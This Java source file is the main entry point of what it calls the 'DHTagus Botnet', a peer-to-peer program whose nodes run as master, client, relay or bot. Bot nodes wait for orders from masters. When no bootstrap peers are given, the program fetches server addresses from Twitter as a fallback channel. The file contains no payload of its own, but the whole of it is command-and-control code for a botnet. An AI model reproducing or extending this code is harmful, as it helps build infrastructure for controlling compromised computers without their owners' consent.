package godfather;

import godfather.bootstrap.BootstrapPeer;
import godfather.bootstrap.BootstrapPeersList;
import godfather.menu.BotUI;
import godfather.menu.MasterUI;
import godfather.twitter.FallBackBootStraper;

import org.apache.log4j.Logger;
import org.apache.log4j.PropertyConfigurator;


public class GodfatherMain {
    static Logger logger = Logger.getLogger(GodfatherMain.class);

    private final static int WAITING_TIME = 2000;

    public static void main(String[] args) throws Exception {
        PropertyConfigurator.configure("log4j.properties");
        logger.info("Welcome to DHTagus Botnet");

        BootstrapPeersList tryToConnect = null;

        String nodeType = null;


        // PORT IP PORT
        if (args.length == 4) {
            tryToConnect = new BootstrapPeersList();
            tryToConnect.addPeer(args[1], args[2]);
            nodeType = args[3];
        }

        // Read the bootstrap file
        if (args.length == 3) {
            tryToConnect = new BootstrapPeersList(args[1]);
            nodeType = args[2];
        }

        // Get servers from Twitter
        if (args.length == 1) {
            tryToConnect = new FallBackBootStraper().GetServers();
            nodeType = args[0];
        }

        PeerType type;
        try {
            if (nodeType == null) {
                throw new IllegalArgumentException("Null");
            }
            type = PeerType.valueOf(nodeType);
        } catch (IllegalArgumentException e) {
            logger.info("Wrong parameters, choose one:");
            logger.info("<LOCALPORT> <BOOTSTRAPIP> <PORT> <master/bot/client/relay> ");
            logger.info("or");
            logger.info("<LOCALPORT> <FILEWITHBOOTSTRAPPEERS>  <master/bot>");
            return;
        }

        String localPort = args[0];



        // Try to connect to one of the passed peers
        Godfather dhtagus = null;

        if (tryToConnect.getBootstrapPeers().values().size() == 0) {
            logger.info("There is no botstrap nodes, get from Twitter");
            tryToConnect = new FallBackBootStraper().GetServers();
        }

        dhtagus = startGodfather(tryToConnect, type, localPort);


        if (dhtagus == null) {
            logger.info("No valid bootstrap");
            return;
        }

        switch (type) {

        case master:
            MasterUI ui = new MasterUI(dhtagus, type);
            ui.start();
            break;

        case client:
            MasterUI ui1 = new MasterUI(dhtagus, type);
            ui1.start();
            break;

        case relay:
            logger.info("************\nRelay ready and waiting orders\n************");
            break;

        case bot:
            logger.info("************\nBot ready and waiting orders\n************");
            BotUI ui2 = new BotUI(dhtagus);
            ui2.start();
            break;

        default:
            break;
        }

    }

    public static Godfather startGodfather(BootstrapPeersList tryToConnect, PeerType type, String localPort) throws InterruptedException {
        Godfather father = null;
        for (BootstrapPeer bp : tryToConnect.getBootstrapPeers().values()) {
            try {
                father = new Godfather(type, localPort, bp.getIp(), bp.getPort(), tryToConnect);
                break; // conect to one only
            } catch (Exception e) {
                System.out.println("FAIL!!!!");
                e.printStackTrace();
                logger.info(e.getMessage());
                tryToConnect.removePeer(bp.getIp());
                Thread.sleep(WAITING_TIME);
            }
        }
        return father;
    }
}
